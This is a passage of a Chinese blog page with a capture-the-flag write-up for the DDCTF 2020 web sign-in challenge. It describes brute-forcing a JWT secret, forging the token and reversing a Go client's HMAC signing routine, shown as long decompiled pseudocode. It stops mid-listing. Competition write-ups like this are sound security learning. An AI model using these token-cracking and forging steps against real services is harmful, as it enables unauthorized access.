@@ -1,0 +1,958 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/apple-touch-icon.png">
+  <link rel="icon" href="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/icon/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="何语灵">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Go实乃知识盲区 这是一篇复现记录，部分思路参考了如下链接，赞美师傅wywwtwx 参考：DDCTF 2020 Writeup - 安全客，安全资讯平台 Web签到题 前面的相信大家都懂，是JWT爆破，但还是梳理一下 根据提示在用POST传参可以拿到JWT  在拿去爆破后可得到Secret值（似乎是你的用户名，然后群里有师傅用户名乱输然后没爆破出来。。） 爆破工具是c-jwt-cracker（需要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF 2020 Web WP">
+<meta property="og:url" content="https://m0ck1ng-b1rd.github.io/2020/08/03/writeup/DDCTF%202020%20Web%20WP/index.html">
+<meta property="og:site_name" content="M0cK1nG-b1Rd&#39;s site">
+<meta property="og:description" content="Go实乃知识盲区 这是一篇复现记录，部分思路参考了如下链接，赞美师傅wywwtwx 参考：DDCTF 2020 Writeup - 安全客，安全资讯平台 Web签到题 前面的相信大家都懂，是JWT爆破，但还是梳理一下 根据提示在用POST传参可以拿到JWT  在拿去爆破后可得到Secret值（似乎是你的用户名，然后群里有师傅用户名乱输然后没爆破出来。。） 爆破工具是c-jwt-cracker（需要">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907201435244.png">
+<meta property="article:published_time" content="2020-08-03T04:21:06.000Z">
+<meta property="article:modified_time" content="2022-04-13T08:22:48.584Z">
+<meta property="article:author" content="何语灵">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907201435244.png">
+  
+  
+  
+  <title>DDCTF 2020 Web WP - M0cK1nG-b1Rd&#39;s site</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/scroll.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"m0ck1ng-b1rd.github.io","root":"/","version":"1.9.0","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"87rdYWc7BpvmNHtufVgH6hwF-gzGzoHsz","app_key":"FOGIb6hlzKdTWSp4wBpACnWG","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>M0cK1nG-b1Rd&#39;s site</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/761607.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DDCTF 2020 Web WP"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2020-08-03 12:21" pubdate>
+          2020年8月3日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          28k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          234 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DDCTF 2020 Web WP</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2022年4月13日 下午
+                  
+                
+              </p>
+            
+            <div class="markdown-body">
+              
+              <p>Go实乃知识盲区</p>
+<p>这是一篇复现记录，部分思路参考了如下链接，赞美师傅wywwtwx</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/216694">DDCTF 2020 Writeup - 安全客，安全资讯平台</a></p>
+<h1 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h1><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907132206609.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>前面的相信大家都懂，是JWT爆破，但还是梳理一下</p>
+<p>根据提示在用POST传参可以拿到JWT</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907133643261.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>在拿去爆破后可得到Secret值（似乎是你的用户名，然后群里有师傅用户名乱输然后没爆破出来。。）</p>
+<p>爆破工具是c-jwt-cracker（需要的<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">自取</a>）</p>
+<p>爆破拿到key后去网站<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io</a> 篡改JWT，而后再次提交</p>
+<p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907133538679.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>就可以拿到client，自此第一关结束。</p>
+<p>第二关是需要在client中构造合法的sign值<br><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/DDCTF%202020%20Web%20WP.assets/20200907133934925.png" srcset="https://picbedddd.oss-cn-beijing.aliyuncs.com/blog/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里可以逆向算法后写脚本，也可以patch，我选的是第一个路子，这块做完后就彻底卡住了</p>
+<p>参考：<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170332">https://www.anquanke.com/post/id/170332</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85694">https://www.anquanke.com/post/id/85694</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7d006f2b4414">https://www.jianshu.com/p/7d006f2b4414</a></p>
+<p>关于算法的逆向：</p>
+<p>七分逆向三分猜，作为一个Web分类下的题，出题人必然不会在Re上卡我们。刚好我同时算半个Re选手，顺便记录一下当时的心路历程。</p>
+<p>当时还不太知道有IDA的Golang插件，不过也是搞了出来。现在顺便加上，看起来也舒服些</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sibears/IDAGolangHelper">https://github.com/sibears/IDAGolangHelper</a></p>
+<p>首先找到我们的关键getSign函数（没有插件可以用老方法String）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main_getSign</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int128 a7, __int64 a8)</span><br>&#123;<br>  __int64 v8; <span class="hljs-comment">// rcx</span><br>  __int64 v9; <span class="hljs-comment">// rdx</span><br>  __int64 v10; <span class="hljs-comment">// r8</span><br>  __int64 v11; <span class="hljs-comment">// rax</span><br>  __int64 v12; <span class="hljs-comment">// rcx</span><br>  __int64 v13; <span class="hljs-comment">// rbx</span><br>  __int64 v14; <span class="hljs-comment">// rdx</span><br>  __int64 v15; <span class="hljs-comment">// r8</span><br>  __int64 v16; <span class="hljs-comment">// r9</span><br>  __int64 v17; <span class="hljs-comment">// rax</span><br>  __int64 v18; <span class="hljs-comment">// rcx</span><br>  __int64 v19; <span class="hljs-comment">// rbx</span><br>  __int64 v20; <span class="hljs-comment">// rdx</span><br>  __int64 v21; <span class="hljs-comment">// r8</span><br>  __int64 v22; <span class="hljs-comment">// r9</span><br>  __int64 v23; <span class="hljs-comment">// rdx</span><br>  __int64 v24; <span class="hljs-comment">// r8</span><br>  __int64 v25; <span class="hljs-comment">// r9</span><br>  __int64 v26; <span class="hljs-comment">// rdx</span><br>  __int64 v27; <span class="hljs-comment">// r8</span><br>  __int64 v28; <span class="hljs-comment">// r9</span><br>  __int64 v29; <span class="hljs-comment">// rdx</span><br>  __int64 v30; <span class="hljs-comment">// rdx</span><br>  __int64 v31; <span class="hljs-comment">// rcx</span><br>  __int64 v32; <span class="hljs-comment">// r8</span><br>  __int64 v33; <span class="hljs-comment">// r9</span><br>  __int64 v34; <span class="hljs-comment">// rdx</span><br>  __int64 v35; <span class="hljs-comment">// r8</span><br>  __int64 v36; <span class="hljs-comment">// rdx</span><br>  __int64 v37; <span class="hljs-comment">// r8</span><br>  __int64 v38; <span class="hljs-comment">// rax</span><br>  __int64 v39; <span class="hljs-comment">// rcx</span><br>  __int64 v40; <span class="hljs-comment">// rbx</span><br>  __int64 v41; <span class="hljs-comment">// rdx</span><br>  __int64 v42; <span class="hljs-comment">// r8</span><br>  __int64 v43; <span class="hljs-comment">// rax</span><br>  __int64 v44; <span class="hljs-comment">// rcx</span><br>  __int64 v45; <span class="hljs-comment">// rbx</span><br>  __int64 v46; <span class="hljs-comment">// rdx</span><br>  __int64 v47; <span class="hljs-comment">// r8</span><br>  __int64 v48; <span class="hljs-comment">// r9</span><br>  __int64 v49; <span class="hljs-comment">// rax</span><br>  __int64 v50; <span class="hljs-comment">// rcx</span><br>  __int64 v51; <span class="hljs-comment">// rbx</span><br>  __int64 (__fastcall **v53)(__int64, __int64); <span class="hljs-comment">// [rsp+0h] [rbp-148h]</span><br>  __int128 v54; <span class="hljs-comment">// [rsp+8h] [rbp-140h]</span><br>  __m256i v55; <span class="hljs-comment">// [rsp+18h] [rbp-130h]</span><br>  __int64 v56; <span class="hljs-comment">// [rsp+38h] [rbp-110h]</span><br>  __int128 v57; <span class="hljs-comment">// [rsp+40h] [rbp-108h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v58; <span class="hljs-comment">// [rsp+50h] [rbp-F8h]</span><br>  __int64 v59; <span class="hljs-comment">// [rsp+58h] [rbp-F0h]</span><br>  __int128 v60; <span class="hljs-comment">// [rsp+60h] [rbp-E8h]</span><br>  __int64 v61; <span class="hljs-comment">// [rsp+70h] [rbp-D8h]</span><br>  __int64 v62; <span class="hljs-comment">// [rsp+78h] [rbp-D0h]</span><br>  __int128 v63; <span class="hljs-comment">// [rsp+80h] [rbp-C8h]</span><br>  __int128 v64; <span class="hljs-comment">// [rsp+90h] [rbp-B8h]</span><br>  __int128 v65; <span class="hljs-comment">// [rsp+A0h] [rbp-A8h]</span><br>  __int128 v66; <span class="hljs-comment">// [rsp+B0h] [rbp-98h]</span><br>  __int64 v67; <span class="hljs-comment">// [rsp+C0h] [rbp-88h]</span><br>  __int64 *v68; <span class="hljs-comment">// [rsp+C8h] [rbp-80h]</span><br>  __int128 v69; <span class="hljs-comment">// [rsp+D0h] [rbp-78h]</span><br>  __int128 v70; <span class="hljs-comment">// [rsp+E0h] [rbp-68h]</span><br>  __int64 v71; <span class="hljs-comment">// [rsp+F0h] [rbp-58h]</span><br>  __int64 v72; <span class="hljs-comment">// [rsp+F8h] [rbp-50h]</span><br>  __int64 v73; <span class="hljs-comment">// [rsp+100h] [rbp-48h]</span><br>  __int64 v74; <span class="hljs-comment">// [rsp+108h] [rbp-40h]</span><br>  __int64 v75; <span class="hljs-comment">// [rsp+110h] [rbp-38h]</span><br>  __int64 v76; <span class="hljs-comment">// [rsp+118h] [rbp-30h]</span><br>  __int64 v77; <span class="hljs-comment">// [rsp+120h] [rbp-28h]</span><br>  __int64 v78; <span class="hljs-comment">// [rsp+128h] [rbp-20h]</span><br>  __int64 v79; <span class="hljs-comment">// [rsp+130h] [rbp-18h]</span><br>  __int64 v80; <span class="hljs-comment">// [rsp+138h] [rbp-10h]</span><br>  __int64 v81; <span class="hljs-comment">// [rsp+140h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v8 = __readfsqword(<span class="hljs-number">0xFFFFFFF8</span>);<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)&amp;v63 &gt; *(_QWORD *)(v8 + <span class="hljs-number">16</span>) )<br>      <span class="hljs-keyword">break</span>;<br>    runtime_morestack_noctxt(a1, a2);<br>  &#125;<br>  v65 = a7;<br>  v56 = a8;<br>  v72 = <span class="hljs-number">0LL</span>;<br>  v73 = <span class="hljs-number">0LL</span>;<br>  v74 = <span class="hljs-number">0LL</span>;<br>  v75 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( &amp;v53 == (__int64 (__fastcall ***)(__int64, __int64))<span class="hljs-number">-248LL</span> )<br>    LODWORD(v72) = (<span class="hljs-type">unsigned</span> __int64)&amp;v63;<br>  *(_QWORD *)&amp;v69 = <span class="hljs-number">2LL</span>;<br>  *((_QWORD *)&amp;v69 + <span class="hljs-number">1</span>) = <span class="hljs-number">2LL</span>;<br>  v68 = &amp;v72;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_6A1040;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v65;<br>  runtime_convT2E(a1, a2, a3, v8, a5);<br>  v11 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v12 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v13 = (__int64)v68;<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  *v68 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v11;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v13 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v11;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v13 + <span class="hljs-number">8</span>) = v11;<br>  &#125;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))&amp;unk_69EDC0;<br>  v54 = (<span class="hljs-type">unsigned</span> __int64)&amp;v56;<br>  runtime_convT2E(a1, a2, v9, v12, v10);<br>  v17 = v55.m256i_i64[<span class="hljs-number">1</span>];<br>  v18 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v19 = (__int64)(v68 + <span class="hljs-number">2</span>);<br>  v61 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v68[<span class="hljs-number">2</span>] = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v62 = v17;<br>  <span class="hljs-keyword">if</span> ( byte_963800 )<br>  &#123;<br>    v53 = (__int64 (__fastcall **)(__int64, __int64))(v19 + <span class="hljs-number">8</span>);<br>    *(_QWORD *)&amp;v54 = v17;<br>    runtime_writebarrierptr(a1, a2);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_QWORD *)(v19 + <span class="hljs-number">8</span>) = v17;<br>  &#125;<br>  *(_QWORD *)&amp;v54 = <span class="hljs-number">5LL</span>;<br>  *((_QWORD *)&amp;v54 + <span class="hljs-number">1</span>) = v68;<br>  *(_OWORD *)v55.m256i_i8 = v69;<br>  fmt_Sprintf(a1, a2, v14, v18, v15, v16, (__int64)<span class="hljs-string">&quot;%s|%d&quot;</span>);<br>  v53 = <span class="hljs-number">0LL</span>;<br>  v64 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">2</span>];<br>  v54 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">2</span>];<br>  runtime_stringtoslicebyte(a1, a2, v20, v55.m256i_i64[<span class="hljs-number">2</span>], v21, v22);<br>  v66 = *(_OWORD *)v55.m256i_i8;<br>  v67 = v55.m256i_i64[<span class="hljs-number">2</span>];<br>  v53 = <span class="hljs-number">0LL</span>;<br>  v58 = <span class="hljs-string">&quot;DDCTFWithYou&quot;</span>;<br>  *(_QWORD *)&amp;v54 = <span class="hljs-string">&quot;DDCTFWithYou&quot;</span>;<br>  v59 = <span class="hljs-number">12LL</span>;<br>  *((_QWORD *)&amp;v54 + <span class="hljs-number">1</span>) = <span class="hljs-number">12LL</span>;<br>  runtime_stringtoslicebyte(a1, a2, v23, (__int64)<span class="hljs-string">&quot;DDCTFWithYou&quot;</span>, v24, v25);<br>  v26 = v55.m256i_i64[<span class="hljs-number">0</span>];<br>  v53 = off_827EE0;<br>  v70 = *(_OWORD *)v55.m256i_i8;<br>  v54 = *(_OWORD *)v55.m256i_i8;<br>  v71 = v55.m256i_i64[<span class="hljs-number">2</span>];<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = v55.m256i_i64[<span class="hljs-number">2</span>];<br>  crypto_hmac_New(a1, a2, v26, v55.m256i_i64[<span class="hljs-number">1</span>], v27, v28);<br>  v54 = v66;<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = v67;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))v55.m256i_i64[<span class="hljs-number">2</span>];<br>  v60 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  (*(<span class="hljs-type">void</span> (__cdecl **)(__int64, __int64, __int64, __int64))(v55.m256i_i64[<span class="hljs-number">1</span>] + <span class="hljs-number">64</span>))(a1, a2, v29, v55.m256i_i64[<span class="hljs-number">1</span>]);<br>  v54 = <span class="hljs-number">0uLL</span>;<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))*((_QWORD *)&amp;v60 + <span class="hljs-number">1</span>);<br>  (*(<span class="hljs-type">void</span> (__cdecl **)(__int64, __int64, __int64, __int64))(v60 + <span class="hljs-number">56</span>))(a1, a2, v30, v31);<br>  v53 = (__int64 (__fastcall **)(__int64, __int64))qword_946330;<br>  v70 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v54 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v71 = v55.m256i_i64[<span class="hljs-number">3</span>];<br>  v55.m256i_i64[<span class="hljs-number">0</span>] = v55.m256i_i64[<span class="hljs-number">3</span>];<br>  encoding_base64__ptr_Encoding_EncodeToString(a1, a2, v55.m256i_i64[<span class="hljs-number">1</span>], v55.m256i_i64[<span class="hljs-number">2</span>], v32, v33);<br>  v57 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v65 = *(_OWORD *)&amp;v55.m256i_u64[<span class="hljs-number">1</span>];<br>  v63 = a7;<br>  v56 = a8;<br>  v76 = <span class="hljs-number">0LL</span>;<br>  v77 = <span class="hljs-number">0LL</span>;<br>  v78 = <span class="hljs-number">0LL</span>;<br>  v79 = <span class="hljs-number">0LL</span>;<br>  v80 = <span 